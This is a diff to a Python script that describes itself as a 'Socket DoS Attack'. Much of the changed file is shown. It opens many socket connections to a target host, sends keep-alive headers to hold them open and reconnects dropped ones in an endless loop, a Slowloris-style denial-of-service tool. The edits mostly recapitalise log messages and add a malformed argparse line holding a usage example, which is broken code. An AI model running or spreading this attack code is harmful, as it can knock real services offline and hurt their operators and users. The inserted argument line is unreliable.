@@ -20,6 +20,7 @@ def init_socket(host, port):
 
 def parse_args():
     parser = argparse.ArgumentParser(description='Socket DoS Attack ( python implementation )')
+    parser.add_argument('python bossyv0.7.py --host IP/Target --port 80 --max-sockets 30000')
     parser.add_argument('-i', '--host', type=str, required=True, help='target host')
     parser.add_argument('-p', '--port', type=int, required=True,
                         help='target port')
@@ -32,7 +33,7 @@ def parse_args():
 
 def main():
     args = parse_args()
-    print("[*] creating {} socket connections...".format(args.max_sockets)) 
+    print("[*] Creating {} Socket Connections".format(args.max_sockets)) 
 
     socket_list=[]
     for _ in range(args.max_sockets):
@@ -42,10 +43,10 @@ def main():
             break
         socket_list.append(s)
 
-    print("[+] {} socket connections created".format(len(socket_list))) 
+    print("[+] {} Socket Connections Created".format(len(socket_list))) 
 
     while True:
-        print("[*] sending \"Keep-Alive\" headers to {} connections".format(len(socket_list)))
+        print("[*] Sending \"Keep-Alive\" Headers To {} Connections".format(len(socket_list)))
         # send keep-alive headers to open connections
         for s in socket_list:
             try:
@@ -56,7 +57,7 @@ def main():
 
         # reconnect disconnected sockets
         if args.max_sockets - len(socket_list):
-            print('[*] creating {} new socket connections'.format(args.max_sockets - len(socket_list)))
+            print('[*] Creating {} New Socket Connections'.format(args.max_sockets - len(socket_list)))
             num_new_connections = 0
             for _ in range(args.max_sockets - len(socket_list)):
                 try:
@@ -66,15 +67,15 @@ def main():
                         num_new_connections += 1
                 except socket.error:
                     break
-            print('[+] {} socket connections created'.format(num_new_connections))
-        print('[*] sleeping {} seconds...'.format(args.reconnection_rate))
+            print('[+] {} Socket Connections Created'.format(num_new_connections))
+        print('[*] Sleeping {} Seconds'.format(args.reconnection_rate))
         time.sleep(args.reconnection_rate)
 
 if __name__=="__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print('[!] exiting.')
+        print('[!] Exiting')
         try:
             sys.exit(0)
         except SystemExit:
